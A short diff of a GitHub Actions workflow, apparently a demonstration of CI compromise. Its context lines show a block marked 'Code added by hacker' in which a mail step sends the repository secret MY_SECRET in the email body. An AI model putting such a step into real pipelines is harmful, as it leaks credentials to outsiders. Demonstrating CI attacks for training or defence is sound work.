@@ -28,7 +28,6 @@ jobs:
         run: |
           mkdir ./bin
           touch ./bin/mybin.exe
-          ls -lR 
 
       ################################################
       # Code added by hacker
@@ -59,6 +58,7 @@ jobs:
           from: Luke Skywalker # <user@example.com>
           # Optional plain body:  
           body: INTERNAL Secret [${{ secrets.MY_SECRET }}].\n Build job of ${{github.repository}} completed successfully!
+
       
       # Simulation of running tests
       - name: Running tests ...
